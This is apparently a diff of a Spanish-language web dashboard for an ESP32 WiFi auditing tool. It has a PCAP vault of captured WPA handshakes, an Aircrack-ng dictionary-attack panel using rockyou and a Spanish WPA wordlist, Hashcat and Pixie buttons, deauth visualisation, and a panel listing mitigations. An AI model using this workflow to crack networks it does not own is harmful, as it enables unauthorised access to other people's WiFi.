+                <h2 class="text-xl font-semibold text-blue-400">🗄️ Bóveda de Evidencias Forenses (.PCAP)</h2>
+                <div class="flex items-center gap-3">
+                    <select id="vault-filter" onchange="renderVault()" class="bg-[#0d1117] border border-gray-600 text-gray-300 text-xs px-2 py-1 rounded focus:outline-none focus:border-blue-500">
+                        <option value="all">Filtro: Todos los PCAP</option>
+                        <option value="handshakes">Solo 🔑 Handshakes</option>
+                        <option value="crackeable">Solo 🟢 Crackeables (M1+M2)</option>
+                        <option value="beacons">Solo 📡 Beacons (Basura)</option>
+                    </select>
+                    <button onclick="loadCaptures()" class="text-xs bg-gray-700 hover:bg-gray-600 px-3 py-1 rounded text-white font-bold transition shadow border border-gray-600">🔄 Actualizar Bóveda</button>
+                </div>
+            </div>
+            <div class="overflow-y-auto">
+                <table class="w-full text-left text-sm">
+                    <thead class="text-gray-400 border-b border-gray-700 sticky top-0 bg-[#161b22]">
+                        <tr>
+                            <th class="pb-2">Archivo PCAP</th>
+                            <th class="pb-2">Router (SSID / Vendor)</th>
+                            <th class="pb-2">Contenido Forense</th>
+                            <th class="pb-2">Fecha de Captura</th>
+                            <th class="pb-2">Tamaño</th>
+                            <th class="pb-2">Acción</th>
+                        </tr>
+                    </thead>
+                    <tbody id="capturas-body"></tbody>
+                </table>
+            </div>
+        </div>
+
+    </div><!-- /tab-vault -->
+
+    <!-- ══════════════════════════════════════
+         TAB 4 – TERMINAL & TEORÍA
+         ══════════════════════════════════════ -->
+    <div id="tab-term" class="tab-content space-y-6">
+
+        <!-- Terminal en vivo -->
+        <div class="card p-4 flex flex-col h-64 border-green-900 shadow-[0_0_15px_rgba(0,255,0,0.1)]">
+            <div class="flex justify-between items-center mb-4">
+                <h2 class="text-xl font-semibold text-green-500 flex items-center"><span class="mr-2">🖥️</span> Terminal Interactiva del Servidor</h2>
+                <div class="flex gap-2">
+                    <label class="flex items-center gap-2 text-xs text-gray-400 cursor-pointer" title="Ejecutar comandos en Linux Subsystem">
+                        <input type="checkbox" id="wsl-checkbox" class="accent-green-500"> Usar WSL
+                    </label>
+                    <button onclick="document.getElementById('live-terminal').innerText=''" class="text-xs bg-gray-700 hover:bg-gray-600 px-3 py-1 rounded text-white font-bold transition">🧹 Limpiar</button>
+                </div>
+            </div>
+            <div class="bg-black border border-green-900 rounded p-3 flex-1 overflow-y-auto font-mono text-sm shadow-inner relative">
+                <div id="live-terminal" class="text-green-500 whitespace-pre-wrap pb-4">root@soc-server:~# Esperando ejecución de comandos...</div>
+                <div class="absolute bottom-0 w-full h-8 bg-gradient-to-t from-black to-transparent pointer-events-none"></div>
+            </div>
+        </div>
+
+        <!-- Mitigaciones y Teoría -->
+        <div class="card p-4 flex flex-col">
+            <h2 class="text-xl font-semibold text-blue-400 mb-4">📚 Centro de Inteligencia y Mitigación Estratégica</h2>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+                <div class="bg-[#0d1117] p-4 rounded border border-gray-700 hover:border-red-500 transition-colors">
+                    <h3 class="text-red-400 font-bold mb-2 flex items-center gap-2"><span>1.</span> Interceptación 4-Way Handshake</h3>
+                    <p class="text-xs text-gray-400 mb-3">Un atacante intercepta los Nonces y el MIC del intercambio EAPOL para realizar un ataque de diccionario offline. Permite vulnerar redes WPA2-PSK sin interactuar con ellas.</p>
+                    <div class="bg-green-900 bg-opacity-20 border-l-2 border-green-500 p-2 mt-auto">
+                        <span class="text-green-400 font-bold text-xs block mb-1">✅ Mitigación Recomendada</span>
+                        <span class="text-gray-300 text-xs">Desplegar WPA3-SAE (Dragonfly). El uso de Zero-Knowledge Proofs elimina el PSK y hace matemáticamente inviable el crackeo offline. Desactivar el modo de transición WPA2/WPA3.</span>
+                    </div>
+                </div>
+                <div class="bg-[#0d1117] p-4 rounded border border-gray-700 hover:border-purple-500 transition-colors">
+                    <h3 class="text-purple-400 font-bold mb-2 flex items-center gap-2"><span>2.</span> Extracción PMKID (Client-less)</h3>
+                    <p class="text-xs text-gray-400 mb-3">El router expone voluntariamente su identificador criptográfico PMKSA en las tramas (Roaming). Permite al atacante robar material clave sin necesidad de expulsar a usuarios conectados.</p>
+                    <div class="bg-green-900 bg-opacity-20 border-l-2 border-green-500 p-2 mt-auto">
+                        <span class="text-green-400 font-bold text-xs block mb-1">✅ Mitigación Recomendada</span>
+                        <span class="text-gray-300 text-xs">Actualizar firmware de los Puntos de Acceso para desactivar la difusión del PMKID en el Information Element (IE) o deshabilitar el estándar de Fast Roaming inseguro.</span>
+                    </div>
+                </div>
+                <div class="bg-[#0d1117] p-4 rounded border border-gray-700 hover:border-orange-500 transition-colors">
+                    <h3 class="text-orange-400 font-bold mb-2 flex items-center gap-2"><span>3.</span> Inyección y Gemelos Malignos</h3>
+                    <p class="text-xs text-gray-400 mb-3">Las tramas de gestión (Management Frames) en WPA2 viajan sin firma ni cifrado. Esto permite suplantar MACs, forzar Deauths y crear Rogue APs (Evil Twins) indetectables.</p>
+                    <div class="bg-green-900 bg-opacity-20 border-l-2 border-green-500 p-2 mt-auto">
+                        <span class="text-green-400 font-bold text-xs block mb-1">✅ Mitigación Recomendada</span>
+                        <span class="text-gray-300 text-xs">Hacer obligatorio el Management Frame Protection (MFP / 802.11w) en toda la infraestructura empresarial para evitar falsificaciones de identidad y DoS.</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </div><!-- /tab-term -->
+
+    <!-- ══════════════════════════════════════
+         TAB 5 – AIRCRACK-NG COMPLETO
+         ══════════════════════════════════════ -->
+    <div id="tab-crack" class="tab-content space-y-6">
+
+        <!-- Banner -->
+        <div class="bg-green-900 bg-opacity-20 border border-green-700 rounded-lg px-5 py-4 flex flex-col md:flex-row items-center gap-4 shadow-[0_0_20px_rgba(34,197,94,0.2)]">
+            <div class="text-5xl">✈️</div>
+            <div>
+                <h2 class="text-2xl font-bold text-green-400">Centro de Ataque Aircrack-ng</h2>
+                <p class="text-gray-400 text-sm mt-1">Diccionario offline directo contra capturas .PCAP — sin conversión, sin intermediarios</p>
+            </div>
+            <div class="ml-auto flex gap-2 flex-wrap">
+                <button onclick="loadAircrackCaptures()" class="bg-green-700 hover:bg-green-600 border border-green-500 text-white px-4 py-2 rounded font-bold text-sm transition shadow">🔄 Recargar PCaps</button>
+                <button onclick="clearAircrackLog()" class="bg-gray-700 hover:bg-gray-600 border border-gray-500 text-white px-4 py-2 rounded font-bold text-sm transition">🧹 Limpiar Log</button>
+            </div>
+        </div>
+
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+
+            <!-- Panel izquierdo: config -->
+            <div class="lg:col-span-1 space-y-4">
+
+                <!-- PCAP selector -->
+                <div class="card p-4">
+                    <h3 class="text-green-400 font-bold mb-3">📂 Archivo PCAP Objetivo</h3>
+                    <select id="ac-pcap-select" class="w-full bg-[#0d1117] border border-green-800 text-green-300 text-sm px-3 py-2 rounded font-mono focus:outline-none focus:border-green-500 mb-2" onchange="onAcPcapSelect()">
+                        <option value="">— Cargando capturas... —</option>
+                    </select>
+                    <div id="ac-pcap-info" class="hidden bg-[#0d1117] border border-gray-700 rounded p-3 text-xs space-y-1">
+                        <p class="text-gray-400">SSID: <span id="ac-pcap-ssid" class="text-white font-bold"></span></p>
+                        <p class="text-gray-400">Vendor: <span id="ac-pcap-vendor" class="text-blue-300"></span></p>
+                        <div class="flex gap-1 flex-wrap mt-1" id="ac-pcap-badges"></div>
+                    </div>
+                </div>
+
+                <!-- Wordlist -->
+                <div class="card p-4">
+                    <h3 class="text-green-400 font-bold mb-3">📖 Wordlist</h3>
+                    <div class="space-y-2">
+                        <label class="flex items-center gap-2 cursor-pointer p-2 rounded border border-transparent hover:border-green-800 hover:bg-green-900 hover:bg-opacity-10">
+                            <input type="radio" name="ac-wordlist" value="/usr/share/wordlists/rockyou.txt" checked class="accent-green-500">
+                            <div>
+                                <span class="text-sm text-white font-bold">rockyou.txt</span>
+                                <span class="text-xs text-gray-400 block">14 millones de contraseñas</span>
+                            </div>
+                        </label>
+                        <label class="flex items-center gap-2 cursor-pointer p-2 rounded border border-transparent hover:border-green-800 hover:bg-green-900 hover:bg-opacity-10">
+                            <input type="radio" name="ac-wordlist" value="/usr/share/wordlists/fasttrack.txt" class="accent-green-500">
+                            <div>
+                                <span class="text-sm text-white font-bold">fasttrack.txt</span>
+                                <span class="text-xs text-gray-400 block">Rápida — contraseñas más comunes</span>
+                            </div>
+                        </label>
+                        <label class="flex items-center gap-2 cursor-pointer p-2 rounded border border-transparent hover:border-green-800 hover:bg-green-900 hover:bg-opacity-10">
+                            <input type="radio" name="ac-wordlist" value="/usr/share/wordlists/wpa_spanish.txt" class="accent-green-500">
+                            <div>
+                                <span class="text-sm text-white font-bold">wpa_spanish.txt</span>
+                                <span class="text-xs text-gray-400 block">Específica WPA española</span>
+                            </div>
+                        </label>
+                        <label class="flex items-center gap-2 cursor-pointer p-2 rounded border border-transparent hover:border-orange-800 hover:bg-orange-900 hover:bg-opacity-10">
+                            <input type="radio" name="ac-wordlist" value="custom" class="accent-orange-500" id="ac-wl-custom-radio">
+                            <div class="flex-1">
+                                <span class="text-sm text-white font-bold">Ruta personalizada</span>
+                                <input type="text" id="ac-wordlist-custom" placeholder="/home/kali/mi_wordlist.txt"
+                                    class="mt-1 w-full bg-[#0d1117] border border-orange-900 text-orange-300 text-xs px-2 py-1 rounded font-mono focus:outline-none focus:border-orange-500"
+                                    onfocus="document.getElementById('ac-wl-custom-radio').checked=true; updateAircrackFullCmd();">
+                            </div>
+                        </label>
+                    </div>
+                </div>
+
+                <!-- Opciones avanzadas -->
+                <div class="card p-4">
+                    <h3 class="text-green-400 font-bold mb-3">⚙️ Opciones Avanzadas</h3>
+                    <div class="space-y-3">
+                        <label class="flex items-center gap-2 cursor-pointer">
+                            <input type="checkbox" id="ac-opt-essid" class="accent-green-500" onchange="document.getElementById('ac-essid-input-wrap').classList.toggle('hidden',!this.checked); updateAircrackFullCmd();">
+                            <span class="text-sm text-gray-300">Filtrar por ESSID (–e)</span>
+                        </label>
+                        <div id="ac-essid-input-wrap" class="hidden">
+                            <input type="text" id="ac-essid-input" placeholder="Nombre SSID exacto..." oninput="updateAircrackFullCmd()"
+                                class="w-full bg-[#0d1117] border border-gray-700 text-white text-xs px-2 py-1 rounded font-mono focus:outline-none focus:border-green-500">
+                        </div>
+                        <label class="flex items-center gap-2 cursor-pointer">
+                            <input type="checkbox" id="ac-opt-bssid" class="accent-green-500" onchange="document.getElementById('ac-bssid-input-wrap').classList.toggle('hidden',!this.checked); updateAircrackFullCmd();">
+                            <span class="text-sm text-gray-300">Filtrar por BSSID (–b)</span>
+                        </label>
+                        <div id="ac-bssid-input-wrap" class="hidden">
+                            <input type="text" id="ac-bssid-input" placeholder="AA:BB:CC:DD:EE:FF" oninput="updateAircrackFullCmd()"
+                                class="w-full bg-[#0d1117] border border-gray-700 text-white text-xs px-2 py-1 rounded font-mono focus:outline-none focus:border-green-500">
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Panel derecho: comando + log -->
+            <div class="lg:col-span-2 space-y-4">
+
+                <!-- Comando generado -->
+                <div class="card p-4">
+                    <h3 class="text-green-400 font-bold mb-3">💻 Comando Generado</h3>
+                    <div class="bg-black border border-green-900 rounded p-3 font-mono text-sm text-green-400 break-all mb-3">
+                        <span id="ac-cmd-preview">aircrack-ng &lt;archivo.pcap&gt; -w &lt;wordlist&gt;</span>
+                    </div>
+                    <div class="flex flex-wrap gap-2">
+                        <button onclick="runAircrackFull()" class="bg-green-700 hover:bg-green-600 border border-green-500 text-white px-5 py-2 rounded font-bold text-sm transition shadow-lg flex items-center gap-2">
+                            ▶️ Ejecutar en Servidor (WSL)
+                        </button>
+                        <button onclick="copyAircrackCmd()" class="bg-gray-700 hover:bg-gray-600 border border-gray-500 text-white px-4 py-2 rounded font-bold text-sm transition flex items-center gap-2">
+                            📋 Copiar Comando
+                        </button>
+                        <button onclick="stopAircrack()" id="ac-stop-btn" class="hidden bg-red-700 hover:bg-red-600 border border-red-500 text-white px-4 py-2 rounded font-bold text-sm transition flex items-center gap-2">
+                            🛑 Detener
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Banner de resultado -->
+                <div id="ac-result-banner" class="hidden card p-4 border-l-4 border-green-500 bg-green-900 bg-opacity-20">
+                    <div class="flex items-center gap-3">
+                        <span class="text-3xl" id="ac-result-icon">🔓</span>
+                        <div>
+                            <p class="font-bold text-green-400 text-lg" id="ac-result-title">Contraseña Encontrada</p>
+                            <p class="font-mono text-white text-xl font-bold mt-1" id="ac-result-password">—</p>
+                            <p class="text-xs text-gray-400 mt-1" id="ac-result-meta"></p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Log de salida -->
+                <div class="card p-4 flex flex-col" style="height: 380px;">
+                    <div class="flex justify-between items-center mb-2">
+                        <h3 class="text-green-400 font-bold flex items-center gap-2">
+                            <span id="ac-log-spinner" class="hidden animate-spin">⚙️</span>
+                            📋 Output de Aircrack-ng
+                        </h3>
+                        <label class="flex items-center gap-1 text-xs text-gray-400 cursor-pointer">
+                            <input type="checkbox" id="ac-autoscroll" checked class="accent-green-500"> Auto-scroll
+                        </label>
+                    </div>
+                    <div id="ac-log" class="flex-1 bg-black border border-green-900 rounded p-3 font-mono text-xs overflow-y-auto whitespace-pre-wrap text-green-500 shadow-inner">
+<span class="text-gray-500">root@soc-server:~# Esperando ejecución de aircrack-ng...</span>
+                    </div>
+                </div>
+
+                <!-- Tabla de handshakes disponibles -->
+                <div class="card p-4">
+                    <h3 class="text-green-400 font-bold mb-3">🔑 Handshakes Disponibles para Crackear</h3>
+                    <div class="overflow-y-auto" style="max-height: 300px;">
+                        <table class="w-full text-left text-sm">
+                            <thead class="text-gray-400 border-b border-gray-700 sticky top-0 bg-[#161b22]">
+                                <tr>
+                                    <th class="pb-2 pr-4">Archivo PCAP</th>
+                                    <th class="pb-2 pr-4">Red (SSID)</th>
+                                    <th class="pb-2 pr-4">Estado</th>
+                                    <th class="pb-2">Acción</th>
+                                </tr>
+                            </thead>
+                            <tbody id="ac-handshakes-body">
+                                <tr><td colspan="4" class="py-6 text-center text-gray-500">Cargando handshakes...</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div><!-- /tab-crack -->
+
+</div><!-- /max-w-7xl -->
+
+<!-- ══════════════════════════════════════════════════════════
+     JAVASCRIPT PRINCIPAL (único bloque)
+     ══════════════════════════════════════════════════════════ -->
+<script>
+    // ── Tab navigation ──
+    function switchTab(tabId) {
+        document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+        document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
+        document.getElementById(tabId).classList.add('active');
+        document.getElementById('btn-' + tabId).classList.add('active');
+        if (tabId === 'tab-radar' && typeof network !== 'undefined') {
+            setTimeout(() => { network.redraw(); network.fit(); }, 60);
+        }
+        if (tabId === 'tab-crack' && acVaultData.length === 0) {
+            loadAircrackCaptures();
+        }
+    }
+
+    // ── Socket.IO ──
+    const socket = io();
+
+    // ── Vis.js graph ──
+    const nodes = new vis.DataSet([]);
+    const edges = new vis.DataSet([]);
+    const container = document.getElementById('network-graph');
+    const graphData = { nodes, edges };
+    const graphOptions = {
+        nodes: { shape: 'dot', font: { color: '#c9d1d9', size: 12, face: 'monospace' }, borderWidth: 2, shadow: true },
+        edges: { width: 1, color: { inherit: 'from', opacity: 0.6 }, smooth: { type: 'continuous' } },
+        physics: {
+            solver: 'forceAtlas2Based',
+            forceAtlas2Based: { gravitationalConstant: -100, centralGravity: 0.005, springLength: 150, springConstant: 0.18 }
+        },
+        interaction: { hover: true, tooltipDelay: 200 }
+    };
+    const network = new vis.Network(container, graphData, graphOptions);
+
+    function stabilizeGraph() { network.physics.options.enabled = !network.physics.options.enabled; }
+    function clearGraph() { nodes.clear(); edges.clear(); }
+
+    function addGraphNode(id, label, type, extraInfo = '') {
+        if (!nodes.get(id)) {
+            let color, size;
+            if (type === 'AP')     { color = { background: '#1e3a8a', border: '#3b82f6' }; size = 25; }
+            else if (type === 'CLIENT') { color = { background: '#064e3b', border: '#10b981' }; size = 15; }
+            else if (type === 'EVIL')   { color = { background: '#7f1d1d', border: '#ef4444' }; size = 30; }
+            nodes.add({ id, label, color, size, title: extraInfo });
+        }
+    }
+
+    function addGraphEdge(from, to, type) {
+        const edgeId = `${from}-${to}`;
+        if (!edges.get(edgeId)) {
+            let color = '#4b5563', dashes = false;
+            if (type === 'PROBE')  { color = '#10b981'; dashes = true; }
+            if (type === 'DEAUTH') { color = '#ef4444'; }
+            edges.add({ id: edgeId, from, to, color: { color }, dashes });
+        }
+    }
+
+    function fireDeauthLaser(from, to) {
+        const edgeId = `laser-${from}-${to}-${Date.now()}`;
+        edges.add({ id: edgeId, from, to, color: { color: '#ff0000', opacity: 1 }, width: 3 });
+        setTimeout(() => edges.remove(edgeId), 500);
+    }
+
+    // ── Charts ──
+    const ctx = document.getElementById('trafficChart').getContext('2d');
+    const trafficChart = new Chart(ctx, {
+        type: 'line',
+        data: {
+            labels: Array(20).fill(''),
+            datasets: [
+                { label: 'Beacons',              borderColor: '#3b82f6', backgroundColor: 'rgba(59,130,246,0.1)', data: Array(20).fill(0), fill: true,  tension: 0.4, pointRadius: 0 },
+                { label: 'Probes',               borderColor: '#10b981', backgroundColor: 'transparent',          data: Array(20).fill(0),               tension: 0.4, pointRadius: 0 },
+                { label: 'Ataques (Deauth/EAPOL)', borderColor: '#ef4444', backgroundColor: 'rgba(239,68,68,0.2)', data: Array(20).fill(0), fill: true, tension: 0.4, pointRadius: 0 }
+            ]
+        },
+        options: { responsive: true, maintainAspectRatio: false, scales: { x: { display: false }, y: { beginAtZero: true, grid: { color: '#30363d' } } }, plugins: { legend: { labels: { color: '#c9d1d9' } } } }
+    });
+
+    const ctxRf = document.getElementById('rfChart').getContext('2d');
+    const rfChart = new Chart(ctxRf, {
+        type: 'bar',
+        data: {
+            labels: Array.from({ length: 126 }, (_, i) => i),
+            datasets: [{ label: 'Energía Bruta', backgroundColor: '#10b981', data: Array(126).fill(0), barPercentage: 1.0, categoryPercentage: 1.0 }]
+        },
+        options: {
+            responsive: true, maintainAspectRatio: false, animation: false,
+            scales: {
+                x: { grid: { display: false }, ticks: { color: '#6b7280', maxTicksLimit: 20 } },
+                y: { beginAtZero: true, max: 100, grid: { color: '#30363d' }, ticks: { display: false } }
+            },
+            plugins: { legend: { display: false } }
+        }
+    });
+
+    // ── COM Ports ──
+    fetch('/api/ports').then(r => r.json()).then(ports => {
+        const select = document.getElementById('com-ports');
+        select.innerHTML = '';
+        ports.forEach(p => select.appendChild(new Option(`${p.path} (${p.manufacturer || '?'})`, p.path)));
+    });
+
+    function connectPort() {
+        fetch('/api/connect', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ port: document.getElementById('com-ports').value }) });
+    }
+
+    // ── Alerts ──
+    let alertsPaused = false;
+    const recentAlerts = {};
+    const radarProbes = {};
+
+    // ── Active Devices ──
+    const activeDevices = {};
+    const activeDevicesFilterOptions = new Set();
+    
+    function clearActiveDevices() {
+        for (let k in activeDevices) delete activeDevices[k];
+        renderActiveDevices();
+    }
+    
+    function renderActiveDevices() {
+        const tbody = document.getElementById('active-devices-body');
+        if (!tbody) return;
+        const filterVal = document.getElementById('active-device-filter').value;
+        
+        // Ordenar por proximidad (RSSI más alto/cercano a 0 primero)
+        const sorted = Object.entries(activeDevices).sort((a,b) => b[1].rssi - a[1].rssi);
+        
+        tbody.innerHTML = '';
+        let count = 0;
+        for (let [mac, data] of sorted) {
+            if (filterVal !== 'all' && data.bssid !== filterVal) continue;
+            let displayName = data.bssid;
+            const networkRow = document.getElementById(`net-${data.bssid.replace(/:/g,'')}`);
+            if (networkRow) {
+                const cell = networkRow.querySelector('.ssid-cell');
+                if (cell) displayName = `<span class="text-purple-400 font-bold">${cell.innerText.replace('⭐ ', '').trim()}</span> <span class="text-[10px] text-gray-500 block">${data.bssid}</span>`;
+            }
+
+            const row = document.createElement('tr');
+            row.id = `dev-${mac.replace(/:/g,'')}`;
+            row.className = "border-b border-gray-800 hover:bg-gray-800 transition-colors";
+            row.innerHTML = `<td class="py-2"><span class="font-mono text-xs text-blue-300 font-bold">${mac}</span><span class="block text-[10px] text-gray-500 mt-1">Disp. Activo</span></td><td class="font-mono text-[10px] text-gray-400">${displayName}</td><td class="font-bold text-white text-xs">${data.pkts}</td><td>${getRssiBadge(data.rssi, data.distance || '')}</td>`;
+            tbody.appendChild(row);
+            
+            count++;
+            if (count >= 50) break;
+        }
+    }
+    
+    function updateActiveDeviceFilterOptions(bssid) {
+        if (!activeDevicesFilterOptions.has(bssid) && bssid !== "FF:FF:FF:FF:FF:FF") {
+            activeDevicesFilterOptions.add(bssid);
+            const select = document.getElementById('active-device-filter');
+            const networkRow = document.getElementById(`net-${bssid.replace(/:/g,'')}`);
+            let ssidName = bssid;
+            if (networkRow) {
+                const cell = networkRow.querySelector('.ssid-cell');
+                if (cell) ssidName = cell.innerText.replace('⭐ ', '').trim();
+            }
+            select.innerHTML += `<option value="${bssid}">${ssidName} (${bssid})</option>`;
+        }
+    }
+
+    // ── Traffic Stats ──
+    const networkStats = {};
+    function ensureNetworkStat(bssid) {
+        if (!networkStats[bssid]) {
+            networkStats[bssid] = { beacons: 0, probes: 0, deauths: 0, eapols: 0 };
+        }
+    }
+    function updateNetworkTrafficUI(bssid) {
+        const td = document.getElementById(`traffic-${bssid.replace(/:/g,'')}`);
+        if (!td) return;
+        const stats = networkStats[bssid];
+        if (!stats) return;
+        
+        const total = stats.beacons + stats.probes + stats.deauths + stats.eapols || 1;
+        const bPct = (stats.beacons / total) * 100;
+        const pPct = (stats.probes / total) * 100;
+        const dPct = (stats.deauths / total) * 100;
+        const ePct = (stats.eapols / total) * 100;
+        
+        td.innerHTML = `
+            <div class="flex items-center gap-2">
+                <div class="flex-1 bg-gray-800 h-2 rounded flex overflow-hidden">
+                    <div style="width:${bPct}%" class="bg-blue-500 transition-all duration-300"></div>
+                    <div style="width:${pPct}%" class="bg-green-500 transition-all duration-300"></div>
+                    <div style="width:${dPct}%" class="bg-red-500 transition-all duration-300"></div>
+                    <div style="width:${ePct}%" class="bg-yellow-500 transition-all duration-300"></div>
+                </div>
+                <div class="text-[10px] text-gray-500 font-mono w-16 text-right">${total} pkts</div>
+            </div>
+        `;
+    }
+    function resetNetworkTraffic() {
+        Object.keys(networkStats).forEach(bssid => {
+            networkStats[bssid] = { beacons: 0, probes: 0, deauths: 0, eapols: 0 };
+            updateNetworkTrafficUI(bssid);
+        });
+    }
+
+    function togglePauseAlerts() {
+        alertsPaused = !alertsPaused;
+        const btn = document.getElementById('btn-pause-alerts');
+        btn.innerText = alertsPaused ? '▶️ Reanudar' : '⏸ Pausar';
+        btn.className = alertsPaused
+            ? 'ml-auto bg-yellow-600 hover:bg-yellow-500 px-3 py-1 rounded text-white font-bold transition'
+            : 'ml-auto bg-gray-700 hover:bg-gray-600 px-3 py-1 rounded text-white font-bold transition';
+    }
+
+    function addAlert(title, desc, isPurple = false, alertSsid = '') {
+        if (alertsPaused) return;
+        const targetSsid = document.getElementById('target-ssid-input').value.trim();
+        if (document.getElementById('f-target').checked && alertSsid !== targetSsid) return;
+        if (document.getElementById('f-decloak').checked && title.includes('OCULTA')) return;
+        if (document.getElementById('f-evil').checked && title.includes('EVIL TWIN')) return;
+        const alertKey = title + alertSsid;
+        const now = Date.now();
+        if (recentAlerts[alertKey] && now - recentAlerts[alertKey] < 5000) return;
+        recentAlerts[alertKey] = now;
+        const box = document.getElementById('alerts-box');
+        if (box.innerText.includes('Monitorizando')) box.innerHTML = '';
+        const timeStr = new Date().toLocaleTimeString();
+        const cls = isPurple ? 'alert-purple' : 'alert-red';
+        box.innerHTML = `<div class="${cls} p-3 rounded shadow border-l-4"><strong class="block flex justify-between"><span>${title}</span> <span class="text-xs text-gray-400 font-normal">${timeStr}</span></strong><span class="text-sm mt-1 block">${desc}</span></div>` + box.innerHTML;
+        if (box.children.length > 40) box.lastChild.remove();
+    }
+
+    function getRssiBadge(rssi, distStr) {
+        let color = rssi > -50 ? 'bg-red-500 text-white' : (rssi > -70 ? 'bg-yellow-500 text-black' : 'bg-gray-600 text-white');
+        return `<span class="badge ${color}">${rssi} dBm (${distStr})</span>`;
+    }
+
+    // ── Vault (PCAP) ──
+    let globalVaultFiles = [];
+
+    function loadCaptures() {
+        fetch('/api/capturas').then(r => r.json()).then(files => {
+            globalVaultFiles = files;
+            renderVault();
+        });
+    }
+
+    function renderVault() {
+        const tbody = document.getElementById('capturas-body');
+        const filter = document.getElementById('vault-filter').value;
+        tbody.innerHTML = '';
+        let filteredFiles = globalVaultFiles;
+        if (filter === 'handshakes') filteredFiles = globalVaultFiles.filter(f => f.isHandshake);
+        else if (filter === 'crackeable') filteredFiles = globalVaultFiles.filter(f => f.isHandshake && f.analysis.handshake.includes('M1') && f.analysis.handshake.includes('M2'));
+        else if (filter === 'beacons') filteredFiles = globalVaultFiles.filter(f => !f.isHandshake);
+
+        filteredFiles.forEach(f => {
+            const dateStr = new Date(f.time).toLocaleString();
+            const hsBadges = ['M1','M2','M3','M4'].map(m =>
+                f.analysis.handshake.includes(m)
+                    ? `<span class="bg-green-600 text-white text-[10px] px-1.5 py-0.5 rounded mr-1 font-bold shadow-[0_0_5px_rgba(22,163,74,0.8)]">${m}</span>`
+                    : `<span class="bg-gray-800 text-gray-600 text-[10px] px-1.5 py-0.5 rounded mr-1 font-bold border border-gray-700">${m}</span>`
+            ).join('');
+            const isCrackeable = f.analysis.handshake.includes('M1') && f.analysis.handshake.includes('M2');
+            const completeBadge = isCrackeable ? '<span class="ml-2 text-[10px] text-green-400 font-bold">(CRACKEABLE)</span>' : '<span class="ml-2 text-[10px] text-yellow-500 font-bold">(INCOMPLETO)</span>';
+            const contentType = f.isHandshake
+                ? `<div class="flex flex-col gap-1 mt-1"><div class="flex items-center text-xs">${hsBadges} ${completeBadge}</div><div class="text-[10px] text-gray-400 mt-0.5">Total extraídos: <span class="text-white">${f.analysis.eapols} EAPOLs</span> | ${f.analysis.beacons} Beacons</div></div>`
+                : `<div class="flex flex-col gap-1 mt-1"><div class="text-blue-400 font-bold text-xs flex items-center"><span class="mr-2">📡</span> Beacon Frames</div><div class="text-[10px] text-gray-400 mt-0.5">Total extraídos: ${f.analysis.beacons} Beacons</div></div>`;
+            const handshakeBadge = f.isHandshake ? '<span class="ml-2 bg-red-600 border border-red-400 text-white text-[10px] px-2 py-0.5 rounded-full font-bold animate-pulse shadow-[0_0_8px_rgba(220,38,38,0.8)]">🔑 HANDSHAKE</span>' : '';
+            const rowClass = f.isHandshake ? 'bg-red-900 bg-opacity-20 border-b border-red-900' : 'border-b border-gray-800 hover:bg-gray-800 transition-colors';
+            const dlBtnColor = f.isHandshake ? 'bg-red-700 hover:bg-red-600 border border-red-500 text-white' : 'bg-blue-600 hover:bg-blue-500 text-white';
+            const hcBtn = f.isHandshake ? `<button onclick="openHashcatModal('${f.name}')" class="bg-orange-600 hover:bg-orange-500 text-white px-2 py-1.5 rounded text-xs font-bold transition inline-block mr-1">🔥 Hashcat</button>` : '';
+            const pixieBtn = f.isHandshake ? `<button onclick="openPixieModal('${f.name}')" class="bg-fuchsia-600 hover:bg-fuchsia-500 text-white px-2 py-1.5 rounded text-xs font-bold transition inline-block mr-1">✨ Pixie</button>` : '';
+            const aircrackBtn = f.isHandshake ? `<button onclick="openAircrackModal('${f.name}', '${f.ssid}')" class="bg-green-700 hover:bg-green-600 border border-green-500 text-white px-2 py-1.5 rounded text-xs font-bold transition inline-block mr-1">✈️ Aircrack</button>` : '';
+            const routerInfo = `<span class="flex items-center font-bold text-white">${f.ssid} ${handshakeBadge}</span><span class="text-xs text-blue-400">${f.vendor}</span>`;
+            tbody.innerHTML += `<tr class="${rowClass}"><td class="py-3 font-mono text-[11px] text-gray-300 truncate max-w-[220px]" title="${f.name}">${f.name}</td><td>${routerInfo}</td><td>${contentType}</td><td class="text-xs text-gray-400">${dateStr}</td><td><span class="badge bg-gray-700 text-gray-300 border border-gray-500">${f.size}</span></td><td>${hcBtn}${pixieBtn}${aircrackBtn}<a href="/capturas/${f.name}" download class="${dlBtnColor} px-2 py-1.5 rounded text-xs font-bold transition inline-block">📥 DL</a></td></tr>`;
+        });
+    }
+    loadCaptures();
+
+    // ── WebSocket events ──
+    socket.on('sys_message', data => {
+        if (data.type === 'success') {
+            addAlert('✅ Sistema', data.msg, true);
+            if (data.msg.includes('PCAP')) loadCaptures();
+            if (data.msg.includes('CREDENCIALES')) loadCredentials();
+        }
+    });
+
+    // ── Flash ──
+    function flashESP32() {
+        const port = document.getElementById('com-ports').value;
+        if (!port) { alert('Selecciona un puerto COM primero.'); return; }
+        if (!confirm(`¿Seguro que quieres recompilar y flashear el código en ${port}?\nEsto interrumpirá la monitorización actual.`)) return;
+        document.getElementById('flash-modal').style.display = 'flex';
+        document.getElementById('flash-logs').innerHTML = '<span class="text-blue-400">Iniciando proceso de flasheo. Esto puede tardar unos minutos...</span>\n';
+        document.getElementById('close-flash-btn').classList.add('hidden');
+        fetch('/api/flash', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ port }) })
+            .catch(err => {
+                document.getElementById('flash-logs').innerHTML += `<span class="text-red-500">Error de conexión con el servidor: ${err}</span>\n`;
+                document.getElementById('close-flash-btn').classList.remove('hidden');
+            });
+    }
+    function closeFlashModal() { document.getElementById('flash-modal').style.display = 'none'; }
+
+    socket.on('flash_log', data => {
+        const logs = document.getElementById('flash-logs');
